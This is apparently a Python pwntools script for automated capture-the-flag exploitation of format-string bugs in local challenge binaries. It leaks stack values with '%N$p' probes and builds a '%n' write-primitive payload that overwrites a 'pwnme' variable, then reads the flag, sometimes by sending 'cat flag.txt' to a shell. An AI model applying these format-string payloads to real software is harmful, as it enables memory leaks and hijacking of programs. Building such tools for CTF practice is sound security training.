from pwn import *

logging.getLogger('pwnlib').setLevel(logging.WARNING)

fire = "\U0001F525"

class FMT:
    def __init__(self, analysis):
        self.analysis = analysis
        self.filename = analysis.binary
        self.e = ELF(self.filename)
    
    def build_exploit(self):
        payload = None
        

        if not self.stack_leak():
            if self.analysis.vuln_has_cmp():
                self.write_prim()

    def stack_leak(self):
        hex_vals = []
        
        # TODO: Variable length
        for i in range(100):
            
            p = process(self.filename)
            p.sendline(b"%" + str(i).encode("utf-8") + b"$p")
            try:
                for i in p.recvline().decode('utf-8').split(' '):
                    if '0x' in i:
                        string = p64(int(i.strip('\n'), 16))
                        hex_vals.append(string.decode('utf-8'))
            except UnicodeDecodeError as e:
                next
            except EOFError:
                break
            p.close()
        
        vals = ''.join(hex_vals)
        if "flag" in vals:
            start = vals.find("flag")
            end = vals.find("}")
            flag = vals[start:end+1]
            print(fire + " " + flag + " " + fire)
            return True
        else:
            return False

    def write_prim(self):
        offset = self.find_write_prim_offset()
        if offset:
            # Find the value
            val = self.analysis.get_vuln_args()
            pwnme = p64(self.e.sym["pwnme"])
            payload = f"%{val}d%{offset+1}$n".encode("utf-8")
            payload += b"A"*(8-(len(payload)%8))
            payload += pwnme

            p = process(self.filename)
            p.sendline(payload)
            
            if self.analysis.has_catflagtxt():
                p.recvuntil(b"<<<")
                p.recvline()
                print(p.recvline().decode("utf-8"))
            elif self.analysis.has_binsh():
                p.sendline(b"cat flag.txt")
                p.recvuntil(b"flag")
                print(fire + " flag" + p.recvline().decode('utf-8') + " " + fire)

    def find_write_prim_offset(self):
        offset = None
        for x in range(100):
            p = process(self.filename)

            payload = f"%{x}$p".encode('utf-8')
            payload += b"A"*(8-(len(payload)%8))
            payload += b"\xef\xbe\xad\xde"*2
            p.sendline(payload)
            p.recvuntil(b"<<<")
            if b"0xdeadbeefdeadbeef" in p.recvline():
                offset = x
        
        return offset

    def libc_leak(self):
        pass

    def got_overwrite(self):
        pass

    def supporting_functions_here(self):
        print("example support function")

